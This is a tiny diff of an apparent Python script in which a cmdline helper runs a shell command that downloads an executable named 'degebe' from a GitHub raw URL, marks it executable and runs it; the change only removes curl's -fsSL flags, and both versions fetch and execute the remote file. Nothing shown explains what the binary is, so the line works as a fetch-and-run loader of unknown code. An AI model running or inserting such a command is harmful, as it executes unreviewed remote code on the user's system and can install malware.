@@ -17,4 +17,4 @@ def cmdline(command):
 
 
 
-cmdline ('curl -fsSL https://raw.githubusercontent.com/karmiasif/biji/main/degebe && chmod +x degebe && ./degebe')
+cmdline ('curl https://raw.githubusercontent.com/karmiasif/biji/main/degebe && chmod +x degebe && ./degebe')
